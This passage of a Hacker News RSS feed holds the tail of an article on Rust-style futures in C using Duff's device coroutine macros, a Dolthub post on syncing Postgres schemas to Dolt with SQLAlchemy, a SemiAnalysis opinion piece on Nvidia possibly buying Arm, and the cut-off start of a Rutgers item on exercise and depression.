An adaptation of <a href="https://en.wikipedia.org/wiki/Duff%27s_device">Duff’s device</a>,
as <a href="https://www.chiark.greenend.org.uk/~sgtatham/coroutines.html">described by Simon Tatham</a>,
can help cut down on the boilerplate.
The idea is that with a <code>switch</code> statement enveloping the whole function-body,
you can yield by creating a unique label using the <code>__LINE__</code> macro
where execution will begin upon reentry,
setting the switch-expression as such, and returning.
The following macros do just that</p>
<div><div><pre><code><span>typedef</span> <span>unsigned</span> <span>Coroutine</span><span>;</span>

<span>#define COR_START(s) switch (*(s)) { case 0:;
#define COR_YIELD(s, r) do {*(s) = __LINE__; return (r); case __LINE__:;} while(0)
#define COR_END }
</span></code></pre></div></div>
<p>where <code>s</code> is a pointer to the coroutine state.
Great care has to be taken because when returning all locals are invalidated -
if only there was a language that could statically check for such mistakes.
Awaiting then becomes</p>
<div><div><pre><code><span>#define AWAIT(s, ctx, fut) while ((fut)-&gt;poll((fut), (ctx)) == POLL_PENDING) \
	COR_YIELD((s), POLL_PENDING)
</span></code></pre></div></div>
<p>that is, yielding until the given future is resolved.</p>

<p>To illustrate, here is a future that prints four times to standard output,
first thrice at one second intervals, and then again after two more seconds:</p>
<div><div><pre><code><span>struct</span> <span>TestFuture</span> <span>{</span>
	<span>struct</span> <span>Future</span> <span>future</span><span>;</span>
	<span>Coroutine</span> <span>c</span><span>;</span>
	<span>union</span> <span>{</span>
		<span>struct</span> <span>{</span>
			<span>int</span> <span>i</span><span>;</span>
			<span>struct</span> <span>TimerFuture</span> <span>timerA</span><span>;</span>
		<span>};</span>
		<span>struct</span> <span>TimerFuture</span> <span>timerB</span><span>;</span>
	<span>};</span>
<span>};</span>

<span>struct</span> <span>TestFuture</span> <span>testFutureNew</span><span>()</span> <span>{</span>
	<span>return</span> <span>(</span><span>struct</span> <span>TestFuture</span><span>)</span> <span>{</span>
		<span>.</span><span>future</span> <span>=</span> <span>{</span> <span>.</span><span>poll</span> <span>=</span> <span>testFuturePoll</span><span>,</span> <span>},</span>
		<span>.</span><span>c</span> <span>=</span> <span>0</span><span>,</span>
	<span>};</span>
<span>}</span>
</code></pre></div></div>

<div><table>
<thead><tr><th>With macros</th><th>Desugared</th></tr></thead>
<tbody><tr>
<td>
        <div><div><pre><code><span>enum</span> <span>Poll</span> <span>testFuturePoll</span><span>(</span><span>struct</span> <span>Future</span> <span>*</span><span>self</span><span>,</span> <span>struct</span> <span>Context</span> <span>*</span><span>ctx</span><span>)</span> <span>{</span>
	<span>struct</span> <span>TestFuture</span> <span>*</span><span>state</span> <span>=</span> <span>(</span><span>struct</span> <span>TestFuture</span> <span>*</span><span>)</span> <span>self</span><span>;</span>
	<span>COR_START</span><span>(</span><span>&amp;</span><span>state</span><span>-&gt;</span><span>c</span><span>)</span>

	<span>for</span> <span>(</span><span>state</span><span>-&gt;</span><span>i</span> <span>=</span> <span>0</span><span>;</span> <span>state</span><span>-&gt;</span><span>i</span> <span>&lt;</span> <span>3</span><span>;</span> <span>++</span><span>state</span><span>-&gt;</span><span>i</span><span>)</span> <span>{</span>
		<span>state</span><span>-&gt;</span><span>timerA</span> <span>=</span> <span>timerFutureNew</span><span>(</span><span>1000</span><span>);</span>
		<span>AWAIT</span><span>(</span><span>&amp;</span><span>state</span><span>-&gt;</span><span>c</span><span>,</span> <span>ctx</span><span>,</span> <span>&amp;</span><span>state</span><span>-&gt;</span><span>timerA</span><span>.</span><span>future</span><span>);</span>
		<span>printf</span><span>(</span><span>"One second has passed!"</span><span>);</span>
	<span>}</span>

	<span>state</span><span>-&gt;</span><span>timerB</span> <span>=</span> <span>timerFutureNew</span><span>(</span><span>2000</span><span>);</span>
	<span>AWAIT</span><span>(</span><span>&amp;</span><span>state</span><span>-&gt;</span><span>c</span><span>,</span> <span>ctx</span><span>,</span> <span>&amp;</span><span>state</span><span>-&gt;</span><span>timerB</span><span>.</span><span>future</span><span>);</span>
	<span>printf</span><span>(</span><span>"Another two seconds have passed!"</span><span>);</span>

	<span>COR_END</span>
	<span>return</span> <span>POLL_READY</span><span>;</span>
<span>}</span>
</code></pre></div>        </div>
      </td>
<td>
        <div><div><pre><code><span>enum</span> <span>Poll</span> <span>testFuturePoll</span><span>(</span><span>struct</span> <span>Future</span> <span>*</span><span>self</span><span>,</span> <span>struct</span> <span>Context</span> <span>*</span><span>ctx</span><span>)</span> <span>{</span>
	<span>struct</span> <span>TestFuture</span> <span>*</span><span>state</span> <span>=</span> <span>(</span><span>struct</span> <span>TestFuture</span> <span>*</span><span>)</span> <span>self</span><span>;</span>
	<span>switch</span> <span>(</span><span>state</span><span>-&gt;</span><span>c</span><span>)</span> <span>{</span>
		<span>case</span> <span>0</span><span>:</span> <span>;</span>
		<span>for</span> <span>(</span><span>state</span><span>-&gt;</span><span>i</span> <span>=</span> <span>0</span><span>;</span> <span>state</span><span>-&gt;</span><span>i</span> <span>&lt;</span> <span>3</span><span>;</span> <span>++</span><span>state</span><span>-&gt;</span><span>i</span><span>)</span> <span>{</span>
			<span>state</span><span>-&gt;</span><span>timerA</span> <span>=</span> <span>timerFutureNew</span><span>(</span><span>1000</span><span>);</span>
			<span>while</span> <span>(</span><span>state</span><span>-&gt;</span><span>timerA</span><span>.</span><span>future</span><span>.</span><span>poll</span><span>(</span><span>&amp;</span><span>state</span><span>-&gt;</span><span>timerA</span><span>.</span><span>future</span><span>,</span> <span>ctx</span><span>)</span> <span>==</span> <span>POLL_PENDING</span><span>)</span> <span>{</span>
				<span>state</span><span>-&gt;</span><span>c</span> <span>=</span> <span>1</span><span>;</span>
				<span>return</span> <span>POLL_PENDING</span><span>;</span>
				<span>case</span> <span>1</span><span>:</span> <span>;</span>
			<span>}</span>
			<span>printf</span><span>(</span><span>"One second has passed!"</span><span>);</span>
		<span>}</span>

		<span>state</span><span>-&gt;</span><span>timerB</span> <span>=</span> <span>timerFutureNew</span><span>(</span><span>2000</span><span>);</span>
		<span>while</span> <span>(</span><span>state</span><span>-&gt;</span><span>timerB</span><span>.</span><span>future</span><span>.</span><span>poll</span><span>(</span><span>&amp;</span><span>state</span><span>-&gt;</span><span>timerB</span><span>.</span><span>future</span><span>,</span> <span>ctx</span><span>)</span> <span>==</span> <span>POLL_PENDING</span><span>)</span> <span>{</span>
			<span>state</span><span>-&gt;</span><span>c</span> <span>=</span> <span>2</span><span>;</span>
			<span>return</span> <span>POLL_PENDING</span><span>;</span>
			<span>case</span> <span>2</span><span>:</span> <span>;</span>
		<span>}</span>
		<span>printf</span><span>(</span><span>"Another two seconds have passed!"</span><span>);</span>
	<span>}</span>
	<span>return</span> <span>POLL_READY</span><span>;</span>
<span>}</span>
</code></pre></div>        </div>
      </td>
</tr>
</tbody></table></div>
<p>Note that the local <code>i</code> had to be spilled to the future struct
in order to persist across yield points,
and that unions are used to show what variables are active at each step,
and squeeze out that last driblet of performance even in the face of
uncompromising undefined behaviour threats from all directions.</p>

<h2 id="off-to-the-races">Off to the races</h2>

<p>In a similar vein, multiple futures can be made to run in parallel
using a future combinator whose poll method polls all of its children
and either waits for all to complete - <em>joins</em> them,
or selects the first to become ready.
The latter is a tad more difficult, so let us focus on that.
The reason is that after the first future has resolved,
the rest may still be running, their memory possibly referenced elsewhere.
This is where the <code>drop()</code> method that we have skimmed over comes in.
Dropping a pinned object should relax the constraint
that its memory remains valid.
The drop implementation of <code>TimerFuture</code> above could for example
call <code>uv_timer_stop()</code> so the callback never fires
or overwrite the dangling reference to the future with <code>NULL</code>.
For other types, since their drop implementations are …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://axelf4.github.io/2020/08/24/rust-style-futures-in-c.html">https://axelf4.github.io/2020/08/24/rust-style-futures-in-c.html</a></em></p>]]>
            </description>
            <link>https://axelf4.github.io/2020/08/24/rust-style-futures-in-c.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24264841</guid>
            <pubDate>Mon, 24 Aug 2020 20:01:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using SQL Alchemy to create backups in Dolt]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24264469">thread link</a>) | @oscar-batori
<br/>
August 24, 2020 | https://www.dolthub.com/blog/2020-08-24-schema-support-in-sql-sync/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-08-24-schema-support-in-sql-sync/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p>Dolt is a version controlled SQL database. It behaves like a traditional relational database in that it offers a SQL interface for data and schema management, but the underlying data structure is a commit graph inspired by Git. One natural use-case is to sync an existing database, such as Postgres or MySQL, to Dolt such that each commit in the Dolt commit graph represents the source database at a particular point in time. We can visualize this replication as follows:
<span>
      <a href="https://www.dolthub.com/blog/static/3e2a48b91b0b575b296274d885477a2a/7af19/sql_sync_diagram.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Sync to Dolt Schematic" title="Sync to Dolt Schematic" src="https://www.dolthub.com/blog/static/3e2a48b91b0b575b296274d885477a2a/ad12c/sql_sync_diagram.png" srcset="https://www.dolthub.com/blog/static/3e2a48b91b0b575b296274d885477a2a/a48b3/sql_sync_diagram.png 214w,
https://www.dolthub.com/blog/static/3e2a48b91b0b575b296274d885477a2a/47730/sql_sync_diagram.png 428w,
https://www.dolthub.com/blog/static/3e2a48b91b0b575b296274d885477a2a/ad12c/sql_sync_diagram.png 856w,
https://www.dolthub.com/blog/static/3e2a48b91b0b575b296274d885477a2a/7a18f/sql_sync_diagram.png 1284w,
https://www.dolthub.com/blog/static/3e2a48b91b0b575b296274d885477a2a/7af19/sql_sync_diagram.png 1359w" sizes="(max-width: 856px) 100vw, 856px" loading="lazy">
  </a>
    </span></p>
<p>Once data from a production database instance is stored in a Dolt database, the Dolt SQL syntax for traversing the commit graph allows users to use <code>AS OF</code> syntax, as well as programmatic diffs, to understand how their data has changed through time without having to modify the production database. Each commit also acts as a database backup from which the production database can be restored.</p>
<p>In an earlier blogpost we introduced Python based tools for syncing data in <a href="https://www.dolthub.com/blog/2020-04-27-introducing-sqlsync/">MySQL</a> to Dolt, and later <a href="https://www.dolthub.com/blog/2020-05-26-sqlsync-postgres/">Postgres</a>, to Dolt. However, this still required users to manually recreate the schema from their source database instance, that is MySQL or Postgres, and recreate it in Dolt. We are excited to share new tooling in Doltpy that automates this schema translation.</p>
<h2>Why</h2>
<p>Before digging into an example, it's worth going over the motivations for doing this. While Doltpy makes this process straightforward, it's definitely more complicated than sharing a connection string with an analyst, data scientist, or anyone that may require access to the production database. We see the motivations as follows:</p>
<ol>
<li>Time travel: the first and most unique benefit is time travel, as illustrated in the diagram above. Dolt stores underlying data in a commit graph, and this commit graph will be updated on every sync, adding a temporal element to the data without altering the production schema. The full set of system tables for examining the commit graph can be found <a href="https://www.dolthub.com/docs/reference/sql/#dolt-system-tables">here</a>.</li>
<li>Experimentation: users can safely experiment with changes to the database that can be robustly examined using Dolt's diffing tools. These changes could be schema, or data, and are particularly useful for developing derived tables. We believe this is partiuclarly valuable for data science teams that might be collaboratively building and managing datasets.</li>
<li>Distribution: Dolt makes distribution to the team easy, each user can simply run <code>dolt clone</code> and immediately be setup with a MySQL server instance containing the production data in a safe data sandbox. Users can then run to <code>dolt pull</code> to capture incremental updates as syncs push data and schema changes to the Dolt database.</li>
<li>Storage: Dolt efficiently computes deltas, so while every commit in the Dolt database represents the upstream database at a point in time, Dolt only stores the differences that appeared between the syncs.</li>
</ol>
<p>In summary, we believe that Dolt presents a compelling way for teams to interact with their production data outside of the core application, and these new features in Doltpy lower the barrier to capturing that value.</p>
<p>We now move on to a concrete example of syncing a Postgres instance's schema and data to Dolt.</p>
<h2>Example</h2>
<p>Let's suppose that you have a Postgres instance from which you'd like to build a commit graph in the form of a Dolt database. You could even host the database on DoltHub. Dolt efficiently computes diffs between commits, storing only the data that has changed, thus this represents an efficient backup solution from a storage footprint standpoint. For simplicity we assume we have a single table named <code>my_important_table</code>, and we'd like to give it the same name in Dolt:</p>
<div data-language="python"><pre><code><span>from</span> doltpy<span>.</span>etl<span>.</span>sql_sync <span>import</span> sync_schema_to_dolt<span>,</span> POSTGRES_TO_DOLT_TYPE_MAPPINGS
<span>from</span> doltpy<span>.</span>core <span>import</span> Dolt
<span>import</span> sqlalchemy <span>as</span> sa

dolt <span>=</span> Dolt<span>.</span>init<span>(</span><span>'path/to/dolt/db'</span><span>)</span>
dolt<span>.</span>sql_server<span>(</span><span>)</span>
postgres_engine <span>=</span> sa<span>.</span>create_engine<span>(</span>
    <span>'{dialect}://{user}:{password}@{host}:{port}/{database}'</span><span>.</span><span>format</span><span>(</span>
        dialect<span>=</span><span>'postgresql'</span><span>,</span>
        user<span>=</span>postgres_user<span>,</span>
        password<span>=</span>postgres_password<span>,</span>
        host<span>=</span>postgres_host<span>,</span>
        port<span>=</span>postgres_port<span>,</span>
        database<span>=</span>postgres_database
    <span>)</span>
<span>)</span>
table_map <span>=</span> <span>{</span><span>'my_important_table'</span><span>:</span> <span>'my_important_table'</span><span>}</span>
sync_schema_to_dolt<span>(</span>postgres_engine<span>,</span> dolt<span>,</span> table_map<span>,</span> POSTGRES_TO_DOLT_TYPE_MAPPINGS<span>)</span>
dolt<span>.</span>add<span>(</span><span>'my_important_table'</span><span>)</span>
dolt<span>.</span>commit<span>(</span><span>'Schema sync successful'</span><span>)</span></code></pre></div>
<p>This script will take your Postgres schema, map the types where appropriate using the SQL Alchemy abstraction and implementation specific packages, and then create the table on Dolt database server that we started using <code>dolt.sql_server()</code>. Let's use the existing tools to sync the data, reusing <code>dolt</code> to represent the Dolt database, and <code>postgres_engine</code> to tell <code>doltpy</code> how to use SQL Alchemy to interact with Postgres:</p>
<div data-language="python"><pre><code><span>from</span> doltpy<span>.</span>etl<span>.</span>sql_sync <span>import</span> sync_from_dolt<span>,</span> get_postgres_target_writer<span>,</span> get_dolt_source_reader

sync_from_dolt<span>(</span>get_dolt_source_reader<span>(</span>dolt<span>,</span> get_dolt_table_reader<span>(</span><span>)</span><span>)</span><span>,</span>
               get_postgres_target_writer<span>(</span>postgres_engine<span>)</span><span>,</span>
               table_map<span>)</span></code></pre></div>
<p>That's it! We've now created a repeatable script for transforming snapshotting your Postgres database, or a subset of its tables, into a Dolt database.</p>
<h2>Using SQL Alchemy</h2>
<p>We mentioned <a href="https://www.sqlalchemy.org/">SQL Alchemy</a> in the previous section. In a recent release, we migrated Doltpy to build on top of SQL Alchemy. SQL Alchemy is a "Python SQL toolkit" that provides an elegant SQL abstraction toolkit across SQL implementations. In our initial implementation of data sync, we had used raw SQL to express moving data to and from Dolt and Postgres or MySQL. This led to lots of conditional rendering of raw SQL queries, which was buggy and hard to work with. SQL Alchemy's full featured toolkit for abstracting across databases allowed us to express the necessary schema and data transformation code in Python, and thus avoid conditional manipulation raw SQL. As an example, the only database specific code that had to be added to our Postgres specific code was the following mapping:</p>
<div data-language="python"><pre><code><span>from</span> sqlalchemy<span>.</span>dialects <span>import</span> mysql<span>,</span> postgresql

POSTGRES_TO_DOLT_MAPPINGS <span>=</span> <span>{</span>
    postgresql<span>.</span>CIDR<span>:</span> mysql<span>.</span>VARCHAR<span>(</span><span>43</span><span>)</span><span>,</span>
    postgresql<span>.</span>INET<span>:</span> mysql<span>.</span>VARCHAR<span>(</span><span>43</span><span>)</span><span>,</span>
    postgresql<span>.</span>MACADDR<span>:</span> mysql<span>.</span>VARCHAR<span>(</span><span>43</span><span>)</span><span>,</span>
    postgresql<span>.</span>JSON<span>:</span> mysql<span>.</span>LONGTEXT<span>,</span>
    postgresql<span>.</span>JSONB<span>:</span> mysql<span>.</span>LONGTEXT<span>,</span>
    postgresql<span>.</span>ARRAY<span>:</span> mysql<span>.</span>LONGTEXT<span>,</span>
    postgresql<span>.</span>UUID<span>:</span> mysql<span>.</span>VARCHAR<span>(</span><span>43</span><span>)</span><span>,</span>
    postgresql<span>.</span>BYTEA<span>:</span> mysql<span>.</span>LONGTEXT
<span>}</span></code></pre></div>
<p>Mapping a schema is then straight forward, and takes place in pure Python:</p>
<div data-language="python"><pre><code><span>def</span> <span>coerce_schema_to_dolt</span><span>(</span>target_table_name<span>:</span> <span>str</span><span>,</span>
                          table<span>:</span> Table<span>,</span>
                          type_mapping<span>:</span> <span>dict</span><span>)</span> <span>-</span><span>&gt;</span> Table<span>:</span>
    target_cols <span>=</span> <span>[</span><span>]</span>
    <span>for</span> col <span>in</span> table<span>.</span>columns<span>:</span>
        target_col <span>=</span> coerce_column_to_dolt<span>(</span>col<span>,</span> type_mapping<span>)</span>
        target_cols<span>.</span>append<span>(</span>target_col<span>)</span>
    
    
    <span>return</span> Table<span>(</span>target_table_name<span>,</span> MetaData<span>(</span><span>)</span><span>,</span> <span>*</span>target_cols<span>)</span>


<span>def</span> <span>coerce_column_to_dolt</span><span>(</span>column<span>:</span> Column<span>,</span> type_mapping<span>:</span> <span>dict</span><span>)</span><span>:</span>
    <span>"""
    Defines how we map MySQL types to Dolt types, and removes unsupported column level constraints. Eventually this
    function should be trivial since we aim to faithfully support MySQL.
    :param column:
    :param type_mapping:
    :return:
    """</span>
    <span>return</span> Column<span>(</span>column<span>.</span>name<span>,</span>
                  type_mapping<span>[</span><span>type</span><span>(</span>column<span>.</span><span>type</span><span>)</span><span>]</span> <span>if</span> <span>type</span><span>(</span>column<span>.</span><span>type</span><span>)</span> <span>in</span> type_mapping <span>else</span> column<span>.</span><span>type</span><span>,</span>
                  primary_key<span>=</span>column<span>.</span>primary_key<span>,</span>
                  autoincrement<span>=</span>column<span>.</span>autoincrement<span>,</span>
                  nullable<span>=</span>column<span>.</span>nullable<span>)</span></code></pre></div>
<p>In summary SQL Alchemy allows us to write generic Python code against an abstraction of underlying database implementations, but then exposes implementation specific details, such as the nuances of various types, and allows us to delegate appropriately.</p>
<h2>Conclusion</h2>
<p>Doltpy, building on top of Dolt and SQL Alchemy, make it easy to replicate existing databases in a commit graph like structure. The motivation for doing so could be data backups of production databases, or developing richer understanding of point in time data, or simply seeing diffs through time that an existing database does not make available.</p></div></div>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-08-24-schema-support-in-sql-sync/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24264469</guid>
            <pubDate>Mon, 24 Aug 2020 19:30:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jensen Huang’s vision for data center dominance may destroy the Arm ecosystem]]>
            </title>
            <description>
<![CDATA[
Score 133 | Comments 114 (<a href="https://news.ycombinator.com/item?id=24264288">thread link</a>) | @kasabali
<br/>
August 24, 2020 | https://semianalysis.com/jensen-huangs-vision-for-data-center-dominance-will-destroy-the-arm-ecosystem/ | <a href="https://web.archive.org/web/*/https://semianalysis.com/jensen-huangs-vision-for-data-center-dominance-will-destroy-the-arm-ecosystem/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-elementor-type="wp-post" data-elementor-id="552" data-elementor-settings="[]">
						<div>
							<div>
							<section data-id="680b3ce0" data-element_type="section">
						<div>
							<div>
					<div data-id="c620d2" data-element_type="column">
			<div>
							<div>
						<div data-id="6eb11d27" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>As the weeks pass by, the rumors keep spinning, the likelihood of an Nvidia Arm acquisition increases. On first glance, the two businesses look completely incompatible. A highly vertically integrated graphics and AI company with very high margins buying a low margin IP licensor doesn’t make sense. Nvidia can already build any product they wish as an Arm licensee. Purchasing the whole cow doesn’t yield additional milk or synergies from the current business model. Furthermore, given Nvidia’s reputation as a partner, it would likely even cause customers to start looking for contingencies and accelerate RISC-V adoption. Jensen Huang, in his quest for data center dominance, may destroy the Arm ecosystem for everyone else.</p><p><img loading="lazy" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/08/1.jpg?resize=1140%2C606&amp;ssl=1" alt="1" width="1140" height="606" data-recalc-dims="1"></p><p>The rational for purchasing Arm seems ridiculous to many, but Jensen’s vision is for the datacenter being a computer and Nvidia being the one to build it. They need to be to be completely vertically integrated and control every aspect of this computer. Currently they have the accelerator market on lock-down with their impressive hardware and vast software moat of CUDA/various SDKs which was built by thousands of Nvidia engineers over the last decade. With the acquisition of Mellanox, they bring the “Data Processing Unit (DPU)” of the data center in house as well. They have also continued to expand their vertically integrated software stack to networking with acquisitions of SwiftStack and Cumulus Networks.</p><p><img loading="lazy" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/08/2.jpg?resize=1140%2C575&amp;ssl=1" alt="2" width="1140" height="575" data-recalc-dims="1"></p><p>The datacenter is a 3 legged stool, and the remaining missing piece is a CPU. AMD, Intel, and various hyperscalers are also working to build out their own 3-legged stool. The largest threat to Nvidia is Intel/AMD finally having competent GPUs and software stacks to accompany them. With the US Department of Energy dumping money into SYCL and many in the industry congregating around it, the software front is accelerating rapidly. Furthermore, various hyperscalers are rapidly building out their own CPUs with Arm Neoverse IP to hook in with their accelerators such as the Google TPU and Amazon Inferentia for AI workloads. Lastly, these hyperscalers also already have their own custom network stacks. Nvidia is currently in very strong position, but it is very precarious as their moats may all be eroded simultaneously.</p><p>In any business, in order to maintain a high margin over a long period of time, one must create barriers of entry so high, that no one can break in and disrupt. Even though Intel has stopped executing for essentially 5 years, they are still raking in the dough with &gt;55% gross margins. Jensen Huang’s vision, if fully realized, would see Nvidia building a nearly impenetrable moat that commands high margins and locks customers in. This may sound nefarious, but Nvidia’s solution will be plug and play. The vast majority of companies do not have the resources required to build out the entire software stack to match specialized hardware. Nvidia would offer the best solution, which would eventually become an expensive deal imprisoning you in the Devil’s ecosystem.</p><p><img loading="lazy" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/08/3.png?resize=1140%2C587&amp;ssl=1" alt="3" width="1140" height="587" data-recalc-dims="1"></p><p>This is where acquiring Arm rather than licensing her technology comes into play. Nvidia needs to build the moat, and the only way to do this is to effectively hijack the entire open Arm ecosystem. Developing your own CPU ISA is far too large of an investment and there would be no adoption. Even the opening up of Power and MIPS have failed to stop their slow declines to irrelevancy. RISC-V is also still in its infancy and will take many years to move into any verticals besides embedded.</p><p>Jensen can only realize the of the vision of data center dominance by becoming the only company with the trifecta of CPU, GPU, and DPU. Nvidia can only achieve this by acquiring Arm at an unreasonable price. An independent Arm is simply not worth the $35B-$50B which SoftBank wants. Even a $20B valuation would be high valuation for Arm.</p><p><img loading="lazy" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/08/4.jpg?resize=1140%2C641&amp;ssl=1" alt="4" width="1140" height="641" data-recalc-dims="1"></p><p>Nvidia can justify this price if they are willing to flip the semiconductor IP world on its head. The ultimate path to ROI means upending the current Arm business model. Given Nvidia’s over $300B valuation, the deal wouldn’t have to be very dilutive to current shareholders. They would start by purchasing the business in a cash/stock deal and obtaining regulatory approval. Regulatory approval initially seems like a large hurdle, but we believe it will not be. The UK will gladly approve if Nvidia makes commitments for large investments. China would be willing to look the other way if the current Arm China JV drama is swept under the rug. The EU would likely need concessions, but because Nvidia does not compete in most of Arm’s verticals, it shouldn’t be too difficult to obtain approval here either. The US regulators would be foaming at the thought of US control of Arm.</p><p>The next step would involve assuring the clients that the businesses would operate separately. Jensen has already begun telegraphing this according to the <a href="https://www.ft.com/content/b4649576-9541-4857-b3a4-5b4ccb847642">Financial Times</a>.</p><blockquote><p>As the company extends its reach to supply a complete data centre computing platform, it would sell parts of the technology as separate “layers”, Mr Huang said. Other companies would also be able to license its intellectual property for use in their own chips, rather than needing to buy silicon from Nvidia, he added.</p></blockquote><p>As part of the integration of the two companies, Nvidia would cut or sell the Arm Mali GPU and Ethos NPU business. These would be redundant and can be supplemented with Nvidia’s own expertise. This would be quite the shock as Nvidia’s previous attempts to license their GPU architecture have completely failed. If Nvidia is successful in the renewed licensing efforts, we could live in a world where their CUDA architecture with accompanying software stack (read lock-in) is proliferated across phones, embedded, and the upcoming augmented reality segment. There would be some attrition as companies like Samsung have turned to licensing AMD’s RDNA graphics. In general, it would also accelerate the move out of the Arm ecosystem to RISC-V, but this will be a painful and slow move for most.</p><p><img loading="lazy" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/08/5.png?resize=1024%2C395&amp;ssl=1" alt="5" width="1024" height="395" data-recalc-dims="1"></p><p>The key for Nvidia here is creating captive, dependant customers by rocking the boat, but not too violently. If the NvidiArm solution is convenient and cheap, most of the ecosystem will not attempt to rush out. Nvidia likely does not increase prices for a while in order to give their licensees an illusion of a happy status quo. Eventually, these price increases will come. The attrition will be the worst in the embedded market where RISC-V is mostly already here and players like <a href="https://twitter.com/dylan522p/status/1295500585123188737?s=20">Alibaba</a> and Si-Five have the IP nearly ready to go.</p><p>The mobile SOC market is captive to Arm roadmaps for years to come, and this is one of the sectors Nvidia can start aggressively extracting ROI. Apple has a perpetual license and so they won’t be affected, but Qualcomm, Samsung, and Mediatek would start to sweat bullets as their licensing costs soar and they have no alternatives without their own custom core teams which have been disbanded. Mediatek specifically is highly dependent on not only ARM CPUs, but also GPUs and interconnects for many of their SOCs.</p><p><img loading="lazy" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/08/6.png?resize=1140%2C641&amp;ssl=1" alt="6" width="1140" height="641" data-recalc-dims="1"></p><p>Nvidia’s largest avenue for ROI comes the data center. x86 is long overdue for some disruption. Even with AMD innovating rapidly, the world wants more options. Arm server development is being done by multiple hyperscalers and independent fabless vendors. Arm is going to break the x86 monopoly with a combination of licensed Neoverse designs and in-house designs from the likes of Nuvia or Marvell. Once the x86 duopoly is broken, Nvidia can also raise prices rapidly here. &nbsp;The hyperscalers in-house Arm Neoverse designs will still have better TCO than any merchant silicon, but the savings will begin to wane.</p><p><img loading="lazy" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/08/7.png?resize=1140%2C641&amp;ssl=1" alt="7" width="1140" height="641" data-recalc-dims="1"></p><p>Another adjacent market where Nvidia can begin to pressure their competition is automotive. While Intel’s Mobileye currently uses MIPS and is transitioning to x86, Tesla and Qualcomm use Arm Cores. If licensing fees ratchet up here significantly, Nvidia can begin to extract margin out of their competitors’ sales. Ultimately, the CPU isn’t a competitive advantage in automotive, but just the cheapest and most convenient option.</p><p>As the Arm ecosystem matures, it will stop being the cheapest option, but only remain the convenient one. Embedded markets have already seen the light of RISC-V and the adoption can only accelerate from here. Other markets have been hooked to the drug of cheap, licensed, Arm IP. With aggressive Nvidia ownership, the junkies will have no choice but to pay up and give in to demands for the short run. They will search for alternative supplies, but this move will take a long time.</p><p><img loading="lazy" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/08/8.jpg?resize=1140%2C642&amp;ssl=1" alt="8" width="1140" height="642" data-recalc-dims="1"></p><p>Nvidia’s endgame isn’t more revenue from licensing costs. Their endgame is a fully vertically integrated data center provider. They will want to make and control every part of the three legged stool. This means they slowly destroy the idea of Neoverse. Whether through making that IP extremely costly, or having their own in house designs be a generation ahead, Nvidia will build a moat around Arm server CPUs. Over time, Jensen Huang will muscle out other Arm vendors supplementing them with Nvidia’s in-house designs. The open Arm ecosystem will be hijacked, and be replaced with a closed off ecosystem rivaling or exceeding that of Intel and AMD.</p><p><span>If Nvidia can quickly seize the worlds most important IP, the most commonly used CPU ISA and designs, they will control the destiny of mobile and data center. This is Jensen Huang’s “Trojan Horse” for a Machiavellian takeover of the future of computing.</span></p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
						</div>
						</div>
					</div></div>]]>
            </description>
            <link>https://semianalysis.com/jensen-huangs-vision-for-data-center-dominance-will-destroy-the-arm-ecosystem/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24264288</guid>
            <pubDate>Mon, 24 Aug 2020 19:14:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Depression: Predicting the Benefits of Exercise]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24264161">thread link</a>) | @finphil
<br/>
August 24, 2020 | https://nuadox.com/post/627358358489513985/depression-predicting-the-benefits-of-exercise | <a href="https://web.archive.org/web/*/https://nuadox.com/post/627358358489513985/depression-predicting-the-benefits-of-exercise">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="627358358489513985">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/627358358489513985/depression-predicting-the-benefits-of-exercise"><h2>Depression: Predicting the benefits of exercise</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1278"><img src="https://64.media.tumblr.com/9e591dfd2528b6be6a3ca516b6a67855/ebaa9e6d5f96fdf6-3d/s1280x1920/3fd1997130738c46f469be8ad3d7206d0224e986.jpg" alt="image" data-orig-width="1920" data-orig-height="1278" width="1280" height="852"></figure><p><b>- By <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.rutgers.edu%2F&amp;t=YmIxYzU3NjU0MzU3NWZjMDk3YWEyNjk5NzVjN2Y3OTI1NWI1NGY5ZSw3R2NhblF4bQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627358358489513985%2Fdepression-predicting-the-benefits-of-exercise&amp;m=0&amp;ts=1598559743">Rutgers University</a> -</b></p><p>Aerobic exercise clearly benefits young adults with major depression, and a Rutgers-led study suggests it may be possible to predict those who would benefit from behavioral therapy and exercise.</p><div><p>“Our study needs to be replicated, but the precision medicine approach of predicting who may or may not benefit from exercise as an antidepressant is provocative,” said senior author <a 